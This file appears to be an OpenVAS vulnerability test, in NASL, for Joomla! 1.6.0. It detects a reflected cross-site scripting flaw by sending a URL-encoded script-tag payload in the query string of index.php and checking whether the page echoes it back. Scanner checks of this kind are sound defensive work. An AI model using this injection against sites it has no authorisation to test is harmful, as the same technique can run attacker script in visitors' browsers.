##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_query_string_param_xss_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Joomla! Query String Parameter Multiple Cross-Site Scripting Vulnerabilities
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
################################i###############################################

tag_impact = "Successful exploitation will let attackers to execute arbitrary script code
  in the browser of an unsuspecting user in the context of the affected site.
  Impact Level: Application.";
tag_affected = "Joomla! version 1.6.0";
tag_insight = "The flaw is caused by an input validation error in the Query String Parameter
  in 'index.php' when processing user-supplied data, which could be exploited
  by attackers to cause arbitrary scripting code to be executed by the user's
  browser in the security context of an affected site.";
tag_solution = "Upgrade Joomla! version to 1.6.1 or later.
  For updates refer to http://www.joomla.org";
tag_summary = "This host is running Joomla and is prone to multiple cross-site
  scripting vulnerabilities.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802016");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-04-22 16:38:12 +0200 (Fri, 22 Apr 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Joomla! Query String Parameter Multiple Cross-Site Scripting Vulnerabilities");
  script_xref(name : "URL" , value : "http://securityreason.com/exploitalert/10169");
  script_xref(name : "URL" , value : "http://seclists.org/fulldisclosure/2011/Mar/157");
  script_xref(name : "URL" , value : "http://www.securityfocus.com/archive/1/516982/30/270/threaded");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");

joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

sndReq = http_get(item:string(joomlaDir, '/index.php/using-joomla/extensions' +
         '/templates?%27%2522%253E%253Cscript%253Ealert(%252FOpenVAS-XSS-Att' +
         'ack-Test%252F)%253C%252Fscript%253E=1'), port:joomlaPort);
rcvRes = http_send_recv(port:joomlaPort, data:sndReq);

if(rcvRes =~ "HTTP/1\.. 200" && "><script>alert(/OpenVAS-XSS-Attack-Test/)</script>=1" >< rcvRes){
  security_message(joomlaPort);
}
